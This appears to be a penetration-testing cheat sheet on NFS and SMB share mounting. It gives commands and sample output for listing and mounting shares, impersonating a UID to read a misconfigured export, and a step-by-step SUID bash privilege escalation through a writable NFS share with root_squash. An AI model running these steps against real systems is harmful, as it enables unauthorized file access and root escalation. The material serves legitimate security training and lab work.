---
title: "Share Mount"
date: 2025-8-3
tags: ["NFS", "Mount", "SMB", "File System Mounting", "Enumeration", "Share", "Cifs", "File System Permissions Vulnerabilities", "Privilege Escalation", "uid"]
---

{{< tab set1 tab1 >}}NFS{{< /tab >}}
{{< tab set1 tab2 >}}SMB{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### List Shares

```console
showmount -e <TARGET>
```

```console {class="sample-code"}
$ showmount -e 10.10.11.191
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```

#### Mount Share

```console
sudo mkdir /mnt/share
```

```console {class="sample-code"}
$ sudo mkdir /mnt/share
```

```console
sudo mount -t nfs <TARGET>:<SHARE> /mnt/share/
```

```console {class="sample-code"}
$ sudo mount -t nfs 10.10.11.191:/home/ross /mnt/share/

$ ls /mnt/share 
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
```

#### Unmount Share

```console
sudo umount /mnt/share/
```

```console {class="sample-code"}
$ sudo umount /mnt/share/
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### Mount Share

```console
sudo mount -t cifs //<TARGET>/<SHARE> /mnt
```

```console
# Without creds
sudo mount -t cifs -o user=,password= //<TARGET>/<SHARE> /mnt
```

```console
# With creds
sudo mount -t cifs -o user='<USER>',pass='<PASSWORD>' //<TARGET>/<SHARE> /mnt
```

```console {class="sample-code"}
$ sudo mount -t cifs -o ro,user='localadmin',password='Secret123' //10.10.11.102/Shared /mnt

$ ls /mnt      
Documents  Software
```

#### Mount inside Windows

```console
# Mount
net use \\localhost\c$ /u:'<DOMAIN>\<USER>' '<PASSWORD>'
```

```console
# Check
dir \\localhost\c$\users\administrator\desktop
```

{{< /tabcontent >}}

---

### Abuse #1: Create Fake User to Read Misconfigured Share

```console
# Check all mounted drives
mount
```

```console {class="sample-code"}
$ mount     

---[SNIP]---
10.10.11.191:/home/ross on /mnt/share type nfs4 (rw,relatime,vers=4.2,rsize=262144,wsize=262144,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.10.14.31,local_lock=none,addr=10.10.11.191)
```

```console
# Check how shares are mounted
cat /etc/exports
```

```console {class="sample-code"}
$ cat /etc/exports
/var/nfsshare *(rw,sync,root_squash,no_all_squash)
/opt *(rw,sync,root_squash,no_all_squash)
```

<br>

```console
+-----------------------------------------------------------------------------------------+
| root_squash  : running as root on local system will be treated as nobody user in target |
| no_all_squash: every other users permission will translate from local system to target  |
+-----------------------------------------------------------------------------------------+
```

<br>

```console
# Add dummy user
sudo adduser --uid <UID> dummy
```

```console {class="sample-code"}
$ sudo adduser --uid 1001 dummy
useradd warning: dummy's uid 1001 outside of the UID_MIN 1000 and UID_MAX 60000 range.
New password: 
Retype new password: 
passwd: password updated successfully
Changing the user information for dummy
Enter the new value, or press ENTER for the default
        Full Name []: dummy
        Room Number []: 
        Work Phone []: 
        Home Phone []: 
        Other []: 
Is the information correct? [Y/n] Y
```

```console
# Switch to dummy user
sudo su dummy -c bash
```

```console {class="sample-code"}
$ sudo su dummy
$ id
uid=1001(dummy) gid=1001(dummy) groups=1001(dummy)
```

---

### Abuse #2: Writable NFS Share to Privesc

#### 1. Make a '/bin/bash' Copy in Target Machine

```console
# Copy '/bin/bash' to writable NFS share
cp /bin/bash .
```

```console {class="sample-code"}
(remote) www-data@mail01:/opt/share$ cp /bin/bash .
```

#### 2. Create a Fake User

```console
# In local machine
sudo adduser --uid <UID> <USER>
```

```console {class="sample-code"}
$ sudo adduser --uid 1001 fakeuser
useradd warning: fakeuser's uid 1001 outside of the UID_MIN 1000 and UID_MAX 60000 range.
New password: 
Retype new password: 
passwd: password updated successfully
Changing the user information for fakeuser
Enter the new value, or press ENTER for the default
        Full Name []: fakeuser
        Room Number []: 
        Work Phone []: 
        Home Phone []: 
        Other []: 
Is the information correct? [Y/n] Y
```

#### 3. Get the 'bash' Copy

```console
# Mount share
sudo mount -t nfs <TARGET>:<SHARE> /mnt/share/
```

```console
# Switch to fakeuser
su fakeuser
```

```console
# Move 'bash' copy to a temp location
cp /mnt/share/bash /tmp/bash
```

#### 4. Move the 'bash' Copy Back to Target Machine

```console
# In target machine
rm bash
```

```console
# Upload the 'bash' copy owned by fakeuser
cp /tmp/bash /mnt/share
```

#### 5. Set SUID bit of the 'bash' Copy

```console
# In local machine
chmod u+s /mnt/share/bash
```

#### 6. Privesc

```console
# In target machine, check
ls -l
```

```console {class="sample-code"}
(remote) www-data@mail01:/opt/share$ ls -la
total 1380
drwxrwxrwx 2 nobody                 nogroup      4096 Aug  3 17:23 .
drwxr-xr-x 4 root                   root         4096 Jun 17  2023 ..
-rw-r--r-- 1 root                   root         6003 Jun 18  2023 backup.tar.gz
-rwsr-xr-x 1 peter.turner@example.com 902601108 1396520 Aug  3 17:23 bash
```

```console
# Privesc
./bash -p
```